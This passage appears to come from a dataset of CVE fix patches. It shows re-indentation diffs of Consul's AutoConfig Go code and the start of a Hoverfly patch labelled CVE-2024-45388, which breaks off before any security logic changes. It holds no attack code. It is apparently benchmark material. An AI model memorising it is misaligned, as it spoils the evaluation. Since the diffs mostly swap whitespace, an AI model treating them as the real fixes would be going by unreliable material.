DatacenterJoinAddresses(partition, segment string) ([]string, error)\n+        ForwardRPC(method string, info structs.RPCInfo, reply interface{}) (bool, error)\n+        GetCARoots() (*structs.IndexedCARoots, error)\n+        SignCertificate(csr *x509.CertificateRequest, id connect.CertURI) (*structs.IssuedCert, error)\n }\n \n // AutoConfig endpoint is used for cluster auto configuration operations\n type AutoConfig struct {\n-\t// currently AutoConfig does not support pushing down any configuration that would be reloadable on the servers\n-\t// (outside of some TLS settings such as the configured CA certs which are retrieved via the TLS configurator)\n-\t// If that changes then we will need to change this to use an atomic.Value and provide means of reloading it.\n-\tconfig          *Config\n-\ttlsConfigurator *tlsutil.Configurator\n-\n-\tbackend    AutoConfigBackend\n-\tauthorizer AutoConfigAuthorizer\n+        // currently AutoConfig does not support pushing down any configuration that would be reloadable on the servers\n+        // (outside of some TLS settings such as the configured CA certs which are retrieved via the TLS configurator)\n+        // If that changes then we will need to change this to use an atomic.Value and provide means of reloading it.\n+        config          *Config\n+        tlsConfigurator *tlsutil.Configurator\n+\n+        backend    AutoConfigBackend\n+        authorizer AutoConfigAuthorizer\n }\n \n func NewAutoConfig(conf *Config, tlsConfigurator *tlsutil.Configurator, backend AutoConfigBackend, authz AutoConfigAuthorizer) *AutoConfig {\n-\tif conf == nil {\n-\t\tconf = DefaultConfig()\n-\t}\n-\n-\treturn &AutoConfig{\n-\t\tconfig:          conf,\n-\t\ttlsConfigurator: tlsConfigurator,\n-\t\tbackend:         backend,\n-\t\tauthorizer:      authz,\n-\t}\n+        if conf == nil {\n+                conf = DefaultConfig()\n+        }\n+\n+        return &AutoConfig{\n+                config:          conf,\n+                tlsConfigurator: tlsConfigurator,\n+                backend:         backend,\n+                authorizer:      authz,\n+        }\n }\n \n // updateTLSCertificatesInConfig will ensure that the TLS settings regarding how an agent is\n@@ -152,248 +210,248 @@ func NewAutoConfig(conf *Config, tlsConfigurator *tlsutil.Configurator, backend\n // in some cases only if auto_encrypt is enabled on the servers. This endpoint has the option\n // to configure auto_encrypt or potentially in the future to generate the certificates inline.\n func (ac *AutoConfig) updateTLSCertificatesInConfig(opts AutoConfigOptions, resp *pbautoconf.AutoConfigResponse) error {\n-\t// nothing to be done as we cannot generate certificates\n-\tif !ac.config.ConnectEnabled {\n-\t\treturn nil\n-\t}\n-\n-\tif opts.CSR != nil {\n-\t\tcert, err := ac.backend.SignCertificate(opts.CSR, opts.SpiffeID)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"Failed to sign CSR: %w\", err)\n-\t\t}\n-\n-\t\t// convert to the protobuf form of the issued certificate\n-\t\tpbcert, err := pbconnect.NewIssuedCertFromStructs(cert)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tresp.Certificate = pbcert\n-\t}\n-\n-\tconnectRoots, err := ac.backend.GetCARoots()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"Failed to lookup the CA roots: %w\", err)\n-\t}\n-\n-\t// convert to the protobuf form of the issued certificate\n-\tpbroots, err := pbconnect.NewCARootsFromStructs(connectRoots)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tresp.CARoots = pbroots\n-\n-\t// get the non-connect CA certs from the TLS Configurator\n-\tif ac.tlsConfigurator != nil {\n-\t\tresp.ExtraCACertificates = ac.tlsConfigurator.ManualCAPems()\n-\t}\n-\n-\treturn nil\n+        // nothing to be done as we cannot generate certificates\n+        if !ac.config.ConnectEnabled {\n+                return nil\n+        }\n+\n+        if opts.CSR != nil {\n+                cert, err := ac.backend.SignCertificate(opts.CSR, opts.SpiffeID)\n+                if err != nil {\n+                        return fmt.Errorf(\"Failed to sign CSR: %w\", err)\n+                }\n+\n+                // convert to the protobuf form of the issued certificate\n+                pbcert, err := pbconnect.NewIssuedCertFromStructs(cert)\n+                if err != nil {\n+                        return err\n+                }\n+                resp.Certificate = pbcert\n+        }\n+\n+        connectRoots, err := ac.backend.GetCARoots()\n+        if err != nil {\n+                return fmt.Errorf(\"Failed to lookup the CA roots: %w\", err)\n+        }\n+\n+        // convert to the protobuf form of the issued certificate\n+        pbroots, err := pbconnect.NewCARootsFromStructs(connectRoots)\n+        if err != nil {\n+                return err\n+        }\n+\n+        resp.CARoots = pbroots\n+\n+        // get the non-connect CA certs from the TLS Configurator\n+        if ac.tlsConfigurator != nil {\n+                resp.ExtraCACertificates = ac.tlsConfigurator.ManualCAPems()\n+        }\n+\n+        return nil\n }\n \n // updateACLtokensInConfig will configure all of the agents ACL settings and will populate\n // the configuration with an agent token usable for all default agent operations.\n func (ac *AutoConfig) updateACLsInConfig(opts AutoConfigOptions, resp *pbautoconf.AutoConfigResponse) error {\n-\tacl := &pbconfig.ACL{\n-\t\tEnabled:             ac.config.ACLsEnabled,\n-\t\tPolicyTTL:           ac.config.ACLResolverSettings.ACLPolicyTTL.String(),\n-\t\tRoleTTL:             ac.config.ACLResolverSettings.ACLRoleTTL.String(),\n-\t\tTokenTTL:            ac.config.ACLResolverSettings.ACLTokenTTL.String(),\n-\t\tDownPolicy:          ac.config.ACLResolverSettings.ACLDownPolicy,\n-\t\tDefaultPolicy:       ac.config.ACLResolverSettings.ACLDefaultPolicy,\n-\t\tEnableKeyListPolicy: ac.config.ACLEnableKeyListPolicy,\n-\t}\n-\n-\t// when ACLs are enabled we want to create a local token with a node identity\n-\tif ac.config.ACLsEnabled {\n-\t\t// set up the token template - the ids and create\n-\t\ttemplate := structs.ACLToken{\n-\t\t\tDescription: fmt.Sprintf(\"Auto Config Token for Node %q\", printNodeName(opts.NodeName, opts.Partition)),\n-\t\t\tLocal:       true,\n-\t\t\tNodeIdentities: []*structs.ACLNodeIdentity{\n-\t\t\t\t{\n-\t\t\t\t\tNodeName:   opts.NodeName,\n-\t\t\t\t\tDatacenter: ac.config.Datacenter,\n-\t\t\t\t},\n-\t\t\t},\n-\t\t\tEnterpriseMeta: *structs.DefaultEnterpriseMetaInPartition(opts.PartitionOrDefault()),\n-\t\t}\n-\n-\t\ttoken, err := ac.backend.CreateACLToken(&template)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"Failed to generate an ACL token for node %q: %w\", printNodeName(opts.NodeName, opts.Partition), err)\n-\t\t}\n-\n-\t\tacl.Tokens = &pbconfig.ACLTokens{Agent: token.SecretID}\n-\t}\n-\n-\tresp.Config.ACL = acl\n-\treturn nil\n+        acl := &pbconfig.ACL{\n+                Enabled:             ac.config.ACLsEnabled,\n+                PolicyTTL:           ac.config.ACLResolverSettings.ACLPolicyTTL.String(),\n+                RoleTTL:             ac.config.ACLResolverSettings.ACLRoleTTL.String(),\n+                TokenTTL:            ac.config.ACLResolverSettings.ACLTokenTTL.String(),\n+                DownPolicy:          ac.config.ACLResolverSettings.ACLDownPolicy,\n+                DefaultPolicy:       ac.config.ACLResolverSettings.ACLDefaultPolicy,\n+                EnableKeyListPolicy: ac.config.ACLEnableKeyListPolicy,\n+        }\n+\n+        // when ACLs are enabled we want to create a local token with a node identity\n+        if ac.config.ACLsEnabled {\n+                // set up the token template - the ids and create\n+                template := structs.ACLToken{\n+                        Description: fmt.Sprintf(\"Auto Config Token for Node %q\", printNodeName(opts.NodeName, opts.Partition)),\n+                        Local:       true,\n+                        NodeIdentities: []*structs.ACLNodeIdentity{\n+                                {\n+                                        NodeName:   opts.NodeName,\n+                                        Datacenter: ac.config.Datacenter,\n+                                },\n+                        },\n+                        EnterpriseMeta: *structs.DefaultEnterpriseMetaInPartition(opts.PartitionOrDefault()),\n+                }\n+\n+                token, err := ac.backend.CreateACLToken(&template)\n+                if err != nil {\n+                        return fmt.Errorf(\"Failed to generate an ACL token for node %q: %w\", printNodeName(opts.NodeName, opts.Partition), err)\n+                }\n+\n+                acl.Tokens = &pbconfig.ACLTokens{Agent: token.SecretID}\n+        }\n+\n+        resp.Config.ACL = acl\n+        return nil\n }\n \n // updateJoinAddressesInConfig determines the correct gossip endpoints that clients should\n // be connecting to for joining the cluster based on the segment given in the opts parameter.\n func (ac *AutoConfig) updateJoinAddressesInConfig(opts AutoConfigOptions, resp *pbautoconf.AutoConfigResponse) error {\n-\tjoinAddrs, err := ac.backend.DatacenterJoinAddresses(opts.Partition, opts.SegmentName)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n+        joinAddrs, err := ac.backend.DatacenterJoinAddresses(opts.Partition, opts.SegmentName)\n+        if err != nil {\n+                return err\n+        }\n \n-\tif resp.Config.Gossip == nil {\n-\t\tresp.Config.Gossip = &pbconfig.Gossip{}\n-\t}\n+        if resp.Config.Gossip == nil {\n+                resp.Config.Gossip = &pbconfig.Gossip{}\n+        }\n \n-\tresp.Config.Gossip.RetryJoinLAN = joinAddrs\n-\treturn nil\n+        resp.Config.Gossip.RetryJoinLAN = joinAddrs\n+        return nil\n }\n \n // updateGossipEncryptionInConfig will populate the gossip encryption configuration settings\n func (ac *AutoConfig) updateGossipEncryptionInConfig(_ AutoConfigOptions, resp *pbautoconf.AutoConfigResponse) error {\n-\t// Add gossip encryption settings if there is any key loaded\n-\tmemberlistConfig := ac.config.SerfLANConfig.MemberlistConfig\n-\tif lanKeyring := memberlistConfig.Keyring; lanKeyring != nil {\n-\t\tif resp.Config.Gossip == nil {\n-\t\t\tresp.Config.Gossip = &pbconfig.Gossip{}\n-\t\t}\n-\t\tif resp.Config.Gossip.Encryption == nil {\n-\t\t\tresp.Config.Gossip.Encryption = &pbconfig.GossipEncryption{}\n-\t\t}\n-\n-\t\tpk := lanKeyring.GetPrimaryKey()\n-\t\tif len(pk) > 0 {\n-\t\t\tresp.Config.Gossip.Encryption.Key = base64.StdEncoding.EncodeToString(pk)\n-\t\t}\n-\n-\t\tresp.Config.Gossip.Encryption.VerifyIncoming = memberlistConfig.GossipVerifyIncoming\n-\t\tresp.Config.Gossip.Encryption.VerifyOutgoing = memberlistConfig.GossipVerifyOutgoing\n-\t}\n-\n-\treturn nil\n+        // Add gossip encryption settings if there is any key loaded\n+        memberlistConfig := ac.config.SerfLANConfig.MemberlistConfig\n+        if lanKeyring := memberlistConfig.Keyring; lanKeyring != nil {\n+                if resp.Config.Gossip == nil {\n+                        resp.Config.Gossip = &pbconfig.Gossip{}\n+                }\n+                if resp.Config.Gossip.Encryption == nil {\n+                        resp.Config.Gossip.Encryption = &pbconfig.GossipEncryption{}\n+                }\n+\n+                pk := lanKeyring.GetPrimaryKey()\n+                if len(pk) > 0 {\n+                        resp.Config.Gossip.Encryption.Key = base64.StdEncoding.EncodeToString(pk)\n+                }\n+\n+                resp.Config.Gossip.Encryption.VerifyIncoming = memberlistConfig.GossipVerifyIncoming\n+                resp.Config.Gossip.Encryption.VerifyOutgoing = memberlistConfig.GossipVerifyOutgoing\n+        }\n+\n+        return nil\n }\n \n // updateTLSSettingsInConfig will populate the TLS configuration settings but will not\n // populate leaf or ca certficiates.\n func (ac *AutoConfig) updateTLSSettingsInConfig(_ AutoConfigOptions, resp *pbautoconf.AutoConfigResponse) error {\n-\tif ac.tlsConfigurator == nil {\n-\t\t// TLS is not enabled?\n-\t\treturn nil\n-\t}\n+        if ac.tlsConfigurator == nil {\n+                // TLS is not enabled?\n+                return nil\n+        }\n \n-\tvar err error\n+        var err error\n \n-\tresp.Config.TLS, err = ac.tlsConfigurator.AutoConfigTLSSettings()\n-\treturn err\n+        resp.Config.TLS, err = ac.tlsConfigurator.AutoConfigTLSSettings()\n+        return err\n }\n \n // baseConfig will populate the configuration with some base settings such as the\n // datacenter names, node name etc.\n func (ac *AutoConfig) baseConfig(opts AutoConfigOptions, resp *pbautoconf.AutoConfigResponse) error {\n-\tif opts.NodeName == \"\" {\n-\t\treturn fmt.Errorf(\"Cannot generate auto config response without a node name\")\n-\t}\n+        if opts.NodeName == \"\" {\n+                return fmt.Errorf(\"Cannot generate auto config response without a node name\")\n+        }\n \n-\tresp.Config.Datacenter = ac.config.Datacenter\n-\tresp.Config.PrimaryDatacenter = ac.config.PrimaryDatacenter\n-\tresp.Config.NodeName = opts.NodeName\n-\tresp.Config.SegmentName = opts.SegmentName\n-\tresp.Config.Partition = opts.Partition\n+        resp.Config.Datacenter = ac.config.Datacenter\n+        resp.Config.PrimaryDatacenter = ac.config.PrimaryDatacenter\n+        resp.Config.NodeName = opts.NodeName\n+        resp.Config.SegmentName = opts.SegmentName\n+        resp.Config.Partition = opts.Partition\n \n-\treturn nil\n+        return nil\n }\n \n type autoConfigUpdater func(c *AutoConfig, opts AutoConfigOptions, resp *pbautoconf.AutoConfigResponse) error\n \n var (\n-\t// variable holding the list of config updating functions to execute when generating\n-\t// the auto config response. This will allow for more easily adding extra self-contained\n-\t// configurators here in the future.\n-\tautoConfigUpdaters []autoConfigUpdater = []autoConfigUpdater{\n-\t\t(*AutoConfig).baseConfig,\n-\t\t(*AutoConfig).updateJoinAddressesInConfig,\n-\t\t(*AutoConfig).updateGossipEncryptionInConfig,\n-\t\t(*AutoConfig).updateTLSSettingsInConfig,\n-\t\t(*AutoConfig).updateACLsInConfig,\n-\t\t(*AutoConfig).updateTLSCertificatesInConfig,\n-\t}\n+        // variable holding the list of config updating functions to execute when generating\n+        // the auto config response. This will allow for more easily adding extra self-contained\n+        // configurators here in the future.\n+        autoConfigUpdaters []autoConfigUpdater = []autoConfigUpdater{\n+                (*AutoConfig).baseConfig,\n+                (*AutoConfig).updateJoinAddressesInConfig,\n+                (*AutoConfig).updateGossipEncryptionInConfig,\n+                (*AutoConfig).updateTLSSettingsInConfig,\n+                (*AutoConfig).updateACLsInConfig,\n+                (*AutoConfig).updateTLSCertificatesInConfig,\n+        }\n )\n \n // AgentAutoConfig will authorize the incoming request and then generate the configuration\n // to push down to the client\n func (ac *AutoConfig) InitialConfiguration(req *pbautoconf.AutoConfigRequest, resp *pbautoconf.AutoConfigResponse) error {\n-\t// default the datacenter to our datacenter - agents do not have to specify this as they may not\n-\t// yet know the datacenter name they are going to be in.\n-\tif req.Datacenter == \"\" {\n-\t\treq.Datacenter = ac.config.Datacenter\n-\t}\n-\n-\t// TODO (autoconf) Is performing auto configuration over the WAN really a bad idea?\n-\tif req.Datacenter != ac.config.Datacenter {\n-\t\treturn fmt.Errorf(\"invalid datacenter %q - agent auto configuration cannot target a remote datacenter\", req.Datacenter)\n-\t}\n-\n-\t// TODO (autoconf) maybe panic instead?\n-\tif ac.backend == nil {\n-\t\treturn fmt.Errorf(\"No Auto Config backend is configured\")\n-\t}\n-\n-\t// forward to the leader\n-\tif done, err := ac.backend.ForwardRPC(\"AutoConfig.InitialConfiguration\", req, resp); done {\n-\t\treturn err\n-\t}\n-\n-\t// TODO (autoconf) maybe panic instead?\n-\tif ac.authorizer == nil {\n-\t\treturn fmt.Errorf(\"No Auto Config authorizer is configured\")\n-\t}\n-\n-\t// authorize the request with the configured authorizer\n-\topts, err := ac.authorizer.Authorize(req)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tresp.Config = &pbconfig.Config{}\n-\n-\t// update all the configurations\n-\tfor _, configFn := range autoConfigUpdaters {\n-\t\tif err := configFn(ac, opts, resp); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\treturn nil\n+        // default the datacenter to our datacenter - agents do not have to specify this as they may not\n+        // yet know the datacenter name they are going to be in.\n+        if req.Datacenter == \"\" {\n+                req.Datacenter = ac.config.Datacenter\n+        }\n+\n+        // TODO (autoconf) Is performing auto configuration over the WAN really a bad idea?\n+        if req.Datacenter != ac.config.Datacenter {\n+                return fmt.Errorf(\"invalid datacenter %q - agent auto configuration cannot target a remote datacenter\", req.Datacenter)\n+        }\n+\n+        // TODO (autoconf) maybe panic instead?\n+        if ac.backend == nil {\n+                return fmt.Errorf(\"No Auto Config backend is configured\")\n+        }\n+\n+        // forward to the leader\n+        if done, err := ac.backend.ForwardRPC(\"AutoConfig.InitialConfiguration\", req, resp); done {\n+                return err\n+        }\n+\n+        // TODO (autoconf) maybe panic instead?\n+        if ac.authorizer == nil {\n+                return fmt.Errorf(\"No Auto Config authorizer is configured\")\n+        }\n+\n+        // authorize the request with the configured authorizer\n+        opts, err := ac.authorizer.Authorize(req)\n+        if err != nil {\n+                return err\n+        }\n+\n+        resp.Config = &pbconfig.Config{}\n+\n+        // update all the configurations\n+        for _, configFn := range autoConfigUpdaters {\n+                if err := configFn(ac, opts, resp); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        return nil\n }\n \n func parseAutoConfigCSR(csr string) (*x509.CertificateRequest, *connect.SpiffeIDAgent, error) {\n-\t// Parse the CSR string into the x509 CertificateRequest struct\n-\tx509CSR, err := connect.ParseCSR(csr)\n-\tif err != nil {\n-\t\treturn nil, nil, fmt.Errorf(\"Failed to parse CSR: %w\", err)\n-\t}\n-\n-\t// ensure that a URI SAN is present\n-\tif len(x509CSR.URIs) < 1 {\n-\t\treturn nil, nil, fmt.Errorf(\"CSR didn't include any URI SANs\")\n-\t}\n-\n-\t// Parse the SPIFFE ID\n-\tspiffeID, err := connect.ParseCertURI(x509CSR.URIs[0])\n-\tif err != nil {\n-\t\treturn nil, nil, fmt.Errorf(\"Failed to parse the SPIFFE URI: %w\", err)\n-\t}\n-\n-\tagentID, isAgent := spiffeID.(*connect.SpiffeIDAgent)\n-\tif !isAgent {\n-\t\treturn nil, nil, fmt.Errorf(\"SPIFFE ID is not an Agent ID\")\n-\t}\n-\n-\treturn x509CSR, agentID, nil\n+        // Parse the CSR string into the x509 CertificateRequest struct\n+        x509CSR, err := connect.ParseCSR(csr)\n+        if err != nil {\n+                return nil, nil, fmt.Errorf(\"Failed to parse CSR: %w\", err)\n+        }\n+\n+        // ensure that a URI SAN is present\n+        if len(x509CSR.URIs) < 1 {\n+                return nil, nil, fmt.Errorf(\"CSR didn't include any URI SANs\")\n+        }\n+\n+        // Parse the SPIFFE ID\n+        spiffeID, err := connect.ParseCertURI(x509CSR.URIs[0])\n+        if err != nil {\n+                return nil, nil, fmt.Errorf(\"Failed to parse the SPIFFE URI: %w\", err)\n+        }\n+\n+        agentID, isAgent := spiffeID.(*connect.SpiffeIDAgent)\n+        if !isAgent {\n+                return nil, nil, fmt.Errorf(\"SPIFFE ID is not an Agent ID\")\n+        }\n+\n+        return x509CSR, agentID, nil\n }\n \n func printNodeName(nodeName, partition string) string {\n-\tif acl.IsDefaultPartition(partition) {\n-\t\treturn nodeName\n-\t}\n-\treturn partition + \"/\" + nodeName\n+        if acl.IsDefaultPartition(partition) {\n+                return nodeName\n+        }\n+        return partition + \"/\" + nodeName\n }\n"}
{"cve":"CVE-2024-45388:0708", "fix_patch": "diff --git a/core/hoverfly_funcs.go b/core/hoverfly_funcs.go\nindex 181d2f13..88975816 100644\n--- a/core/hoverfly_funcs.go\n+++ b/core/hoverfly_funcs.go\n@@ -1,436 +1,447 @@\n package hoverfly\n \n import (\n-\t\"fmt\"\n-\t\"io/ioutil\"\n-\t\"net/http\"\n-\t\"path/filepath\"\n-\t\"strings\"\n-\n-\t\"github.com/SpectoLabs/hoverfly/core/errors\"\n-\tv2 \"github.com/SpectoLabs/hoverfly/core/handlers/v2\"\n-\t\"github.com/SpectoLabs/hoverfly/core/matching\"\n-\t\"github.com/SpectoLabs/hoverfly/core/matching/matchers\"\n-\t\"github.com/SpectoLabs/hoverfly/core/models\"\n-\t\"github.com/SpectoLabs/hoverfly/core/modes\"\n-\t\"github.com/SpectoLabs/hoverfly/core/util\"\n-\t\"github.com/SpectoLabs/raymond\"\n-\tlog \"github.com/sirupsen/logrus\"\n+        \"fmt\"\n+        \"io/ioutil\"\n+        \"net/http\"\n+        \"path/filepath\"\n+        \"strings\"\n+\n+        \"github.com/SpectoLabs/hoverfly/core/errors\"\n+        v2 \"github.com/SpectoLabs/hoverfly/core/handlers/v2\"\n+        \"github.com/SpectoLabs/hoverfly/core/matching\"\n+        \"github.com/SpectoLabs/hoverfly/core/matching/matchers\"\n+        \"github.com/SpectoLabs/hoverfly/core/models\"\n+        \"github.com/SpectoLabs/hoverfly/core/modes\"\n+        \"github.com/SpectoLabs/hoverfly/core/util\"\n+        \"github.com/SpectoLabs/raymond\"\n+        log \"github.com/sirupsen/logrus\"\n )\n \n // DoRequest - performs request and returns response that should be returned to client and error\n func (hf *Hoverfly) DoRequest(request *http.Request) (*http.Response, error) {\n \n-\t// We can't have this set. And it only contains \"/pkg/net/http/\" anyway\n-\trequest.RequestURI = \"\"\n+        // We can't have this set. And it only contains \"/pkg/net/http/\" anyway\n+        request.RequestURI = \"\"\n \n-\tclient, err := GetHttpClient(hf, request.Host)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tresp, err := client.Do(request)\n+        client, err := GetHttpClient(hf, request.Host)\n+        if err != nil {\n+                return nil, err\n+        }\n+        resp, err := client.Do(request)\n \n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n+        if err != nil {\n+                return nil, err\n+        }\n \n-\tresp.Header.Set(\"Hoverfly\", \"Was-Here\")\n+        resp.Header.Set(\"Hoverfly\", \"Was-Here\")\n \n-\tif hf.Cfg.Mode == \"spy\" {\n-\t\tresp.Header.Add(\"Hoverfly\", \"Forwarded\")\n-\t}\n+        if hf.Cfg.Mode == \"spy\" {\n+                resp.Header.Add(\"Hoverfly\", \"Forwarded\")\n+        }\n \n-\treturn resp, nil\n+        return resp, nil\n \n }\n \n // GetResponse returns stored response from cache\n func (hf *Hoverfly) GetResponse(requestDetails models.RequestDetails) (*models.ResponseDetails, *errors.HoverflyError) {\n-\tvar response models.ResponseDetails\n-\tvar cachedResponse *models.CachedResponse\n-\n-\tcachedResponse, cacheErr := hf.CacheMatcher.GetCachedResponse(&requestDetails)\n-\n-\t// Get the cached response and return if there is a miss\n-\tif cacheErr == nil && cachedResponse.MatchingPair == nil {\n-\t\treturn nil, errors.MatchingFailedError(cachedResponse.ClosestMiss)\n-\t\t// If it's cached, use that response\n-\t} else if cacheErr == nil {\n-\t\tresponse = cachedResponse.MatchingPair.Response\n-\t\t//If it's not cached, perform matching to find a hit\n-\t} else {\n-\t\tmode := (hf.modeMap[modes.Simulate]).(*modes.SimulateMode)\n-\n-\t\t// Matching\n-\t\tresult := matching.Match(mode.MatchingStrategy, requestDetails, hf.Cfg.Webserver, hf.Simulation, hf.state)\n-\n-\t\t// Cache result\n-\t\tif result.Cacheable {\n-\t\t\tcachedResponse, _ = hf.CacheMatcher.SaveRequestMatcherResponsePair(requestDetails, result.Pair, result.Error)\n-\t\t}\n-\n-\t\t// If we miss, just return\n-\t\tif result.Error != nil {\n-\t\t\tlog.WithFields(log.Fields{\n-\t\t\t\t\"error\":       result.Error.Error(),\n-\t\t\t\t\"query\":       requestDetails.Query,\n-\t\t\t\t\"path\":        requestDetails.Path,\n-\t\t\t\t\"destination\": requestDetails.Destination,\n-\t\t\t\t\"method\":      requestDetails.Method,\n-\t\t\t}).Warn(\"Failed to find matching request from simulation\")\n-\n-\t\t\treturn nil, errors.MatchingFailedError(result.Error.ClosestMiss)\n-\t\t} else {\n-\t\t\tresponse = result.Pair.Response\n-\t\t}\n-\t}\n-\n-\t// Templating applies at the end, once we have loaded a response. Comes BEFORE state transitions,\n-\t// as we use the current state in templates\n-\tif response.Templated == true {\n-\t\tresponseBody, err := hf.applyBodyTemplating(&requestDetails, &response, cachedResponse)\n-\t\tif err == nil {\n-\t\t\tresponse.Body = responseBody\n-\t\t} else {\n-\t\t\tlog.Warnf(\"Failed to applying body templating: %s\", err.Error())\n-\t\t}\n-\n-\t\tresponseHeaders, err := hf.applyHeadersTemplating(&requestDetails, &response, cachedResponse)\n-\t\tif err == nil {\n-\t\t\tresponse.Headers = responseHeaders\n-\t\t} else {\n-\t\t\tlog.Warnf(\"Failed to applying headers templating: %s\", err.Error())\n-\t\t}\n-\n-\t\tresponseTransitionsState, err := hf.applyTransitionsStateTemplating(&requestDetails, &response, cachedResponse)\n-\t\tif err == nil {\n-\t\t\tresponse.TransitionsState = responseTransitionsState\n-\t\t} else {\n-\t\t\tlog.Warnf(\"Failed to applying transitions state templating: %s\", err.Error())\n-\t\t}\n-\t}\n-\n-\t// State transitions after we have the response\n-\tif response.TransitionsState != nil {\n-\t\thf.state.PatchState(response.TransitionsState)\n-\t}\n-\n-\tif response.RemovesState != nil {\n-\t\thf.state.RemoveState(response.RemovesState)\n-\t}\n-\n-\treturn &response, nil\n+        var response models.ResponseDetails\n+        var cachedResponse *models.CachedResponse\n+\n+        cachedResponse, cacheErr := hf.CacheMatcher.GetCachedResponse(&requestDetails)\n+\n+        // Get the cached response and return if there is a miss\n+        if cacheErr == nil && cachedResponse.MatchingPair == nil {\n+                return nil, errors.MatchingFailedError(cachedResponse.ClosestMiss)\n+                // If it's cached, use that response\n+        } else if cacheErr == nil {\n+                response = cachedResponse.MatchingPair.Response\n+                //If it's not cached, perform matching to find a hit\n+        } else {\n+                mode := (hf.modeMap[modes.Simulate]).(*modes.SimulateMode)\n+\n+                // Matching\n+                result := matching.Match(mode.MatchingStrategy, requestDetails, hf.Cfg.Webserver, hf.Simulation, hf.state)\n+\n+                // Cache result\n+                if result.Cacheable {\n+                        cachedResponse, _ = hf.CacheMatcher.SaveRequestMatcherResponsePair(requestDetails, result.Pair, result.Error)\n+                }\n+\n+                // If we miss, just return\n+                if result.Error != nil {\n+                        log.WithFields(log.Fields{\n+                                \"error\":       result.Error.Error(),\n+                                \"query\":       requestDetails.Query,\n+                                \"path\":        requestDetails.Path,\n+                                \"destination\": requestDetails.Destination,\n+                                \"method\":      requestDetails.Method,\n+                        }).Warn(\"Failed to find matching request from simulation\")\n+\n+                        return nil, errors.MatchingFailedError(result.Error.ClosestMiss)\n+                } else {\n+                        response = result.Pair.Response\n+                }\n+        }\n+\n+        // Templating applies at the end, once we have loaded a response. Comes BEFORE state transitions,\n+        // as we use the current state in templates\n+        if response.Templated == true {\n+                responseBody, err := hf.applyBodyTemplating(&requestDetails, &response, cachedResponse)\n+                if err == nil {\n+                        response.Body = responseBody\n+                } else {\n+                        log.Warnf(\"Failed to applying body templating: %s\", err.Error())\n+                }\n+\n+                responseHeaders, err := hf.applyHeadersTemplating(&requestDetails, &response, cachedResponse)\n+                if err == nil {\n+                        response.Headers = responseHeaders\n+                } else {\n+                        log.Warnf(\"Failed to applying headers templating: %s\", err.Error())\n+                }\n+\n+                responseTransitionsState, err := hf.applyTransitionsStateTemplating(&requestDetails, &response, cachedResponse)\n+                if err == nil {\n+                        response.TransitionsState = responseTransitionsState\n+                } else {\n+                        log.Warnf(\"Failed to applying transitions state templating: %s\", err.Error())\n+                }\n+        }\n+\n+        // State transitions after we have the response\n+        if response.TransitionsState != nil {\n+                hf.state.PatchState(response.TransitionsState)\n+        }\n+\n+        if response.RemovesState != nil {\n+                hf.state.RemoveState(response.RemovesState)\n+        }\n+\n+        return &response, nil\n }\n \n func (hf *Hoverfly) readResponseBodyFiles(pairs []v2.RequestMatcherResponsePairViewV5) v2.SimulationImportResult {\n-\tresult := v2.SimulationImportResult{}\n+        result := v2.SimulationImportResult{}\n \n-\tfor i, pair := range pairs {\n-\t\tif len(pair.Response.GetBody()) > 0 && len(pair.Response.GetBodyFile()) > 0 {\n-\t\t\tresult.AddBodyAndBodyFileWarning(i)\n-\t\t\tcontinue\n-\t\t}\n+        for i, pair := range pairs {\n+                if len(pair.Response.GetBody()) > 0 && len(pair.Response.GetBodyFile()) > 0 {\n+                        result.AddBodyAndBodyFileWarning(i)\n+                        continue\n+                }\n \n-\t\tif len(pair.Response.GetBody()) == 0 && len(pair.Response.GetBodyFile()) > 0 {\n-\t\t\tvar content string\n-\t\t\tvar err error\n+                if len(pair.Response.GetBody()) == 0 && len(pair.Response.GetBodyFile()) > 0 {\n+                        var content string\n+                        var err error\n \n-\t\t\tbodyFile := pair.Response.GetBodyFile()\n+                        bodyFile := pair.Response.GetBodyFile()\n \n-\t\t\tif util.IsURL(bodyFile) {\n-\t\t\t\tcontent, err = hf.readResponseBodyURL(bodyFile)\n-\t\t\t} else {\n-\t\t\t\tcontent, err = hf.readResponseBodyFile(bodyFile)\n-\t\t\t}\n+                        if util.IsURL(bodyFile) {\n+                                content, err = hf.readResponseBodyURL(bodyFile)\n+                        } else {\n+                                content, err = hf.readResponseBodyFile(bodyFile)\n+                        }\n \n-\t\t\tif err != nil {\n-\t\t\t\tresult.SetError(fmt.Errorf(\"data.pairs[%d].response %s\", i, err.Error()))\n-\t\t\t\treturn result\n-\t\t\t}\n+                        if err != nil {\n+                                result.SetError(fmt.Errorf(\"data.pairs[%d].response %s\", i, err.Error()))\n+                                return result\n+                        }\n \n-\t\t\tpairs[i].Response.Body = content\n-\t\t}\n-\t}\n+                        pairs[i].Response.Body = content\n+                }\n+        }\n \n-\treturn result\n+        return result\n }\n \n func (hf *Hoverfly) readResponseBodyURL(fileURL string) (string, error) {\n-\tisAllowed := false\n-\tfor _, allowedOrigin := range hf.Cfg.ResponsesBodyFilesAllowedOrigins {\n-\t\tif strings.HasPrefix(fileURL, allowedOrigin) {\n-\t\t\tisAllowed = true\n-\t\t\tbreak\n-\t\t}\n-\t}\n-\n-\tif !isAllowed {\n-\t\treturn \"\", fmt.Errorf(\"bodyFile %s is not allowed. To allow this origin run hoverfly with -response-body-files-allow-origin\", fileURL)\n-\t}\n-\n-\tresp, err := http.DefaultClient.Get(fileURL)\n-\tif err != nil {\n-\t\terr := fmt.Errorf(\"bodyFile %s cannot be downloaded: %s\", fileURL, err.Error())\n-\t\treturn \"\", err\n-\t}\n-\n-\tcontent, err := util.GetResponseBody(resp)\n-\tif err != nil {\n-\t\terr := fmt.Errorf(\"response from bodyFile %s cannot be read: %s\", fileURL, err.Error())\n-\t\treturn \"\", err\n-\t}\n-\n-\treturn content, nil\n+        isAllowed := false\n+        for _, allowedOrigin := range hf.Cfg.ResponsesBodyFilesAllowedOrigins {\n+                if 